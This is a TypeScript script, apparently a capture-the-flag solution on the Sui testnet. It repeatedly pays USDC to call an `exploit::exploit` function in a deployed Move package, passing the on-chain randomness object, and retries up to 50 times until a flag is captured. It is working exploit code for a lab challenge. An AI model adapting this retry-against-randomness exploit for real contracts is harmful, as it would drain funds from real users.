import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const client = new SuiGrpcClient({
  network: 'testnet',
  baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const EXPLOIT_PACKAGE = '0xf7acee7be900fa64c7b17b9ea8fb128287a7c2db7228787f8f617c94a94a950c';
const USDC_TYPE = '0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29::usdc::USDC';
const COST = 12000000;

async function tryOnce(): Promise<boolean> {
  const address = keypair.toSuiAddress();

  const res = await fetch('https://fullnode.testnet.sui.io:443', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      jsonrpc: '2.0', id: 1, method: 'suix_getCoins',
      params: [address, USDC_TYPE, null, 10]
    })
  });
  const json = await res.json();
  const coins = json.result?.data;
  if (!coins || coins.length === 0) throw new Error('No USDC left!');

  const tx = new Transaction();
  const [paymentCoin] = tx.splitCoins(tx.object(coins[0].coinObjectId), [COST]);

  tx.moveCall({
    target: `${EXPLOIT_PACKAGE}::exploit::exploit`,
    arguments: [paymentCoin, tx.object('0x8')],
  });

  const result = await client.signAndExecuteTransaction({ transaction: tx, signer: keypair });
  const success = result.Transaction?.status?.success;
  console.log('Attempt:', success ? '🎉 FLAG!' : '❌ No flag', result.Transaction?.digest);
  return !!success;
}

(async () => {
  for (let i = 1; i <= 50; i++) {
    console.log(`Try #${i}`);
    try {
      const won = await tryOnce();
      if (won) { console.log('Flag captured!'); break; }
    } catch (e: any) {
      if (e.message?.includes('extract_flag')) {
        console.log('❌ No flag, trying again...');
      } else {
        throw e;
      }
    }
    await new Promise(r => setTimeout(r, 500));
  }
})();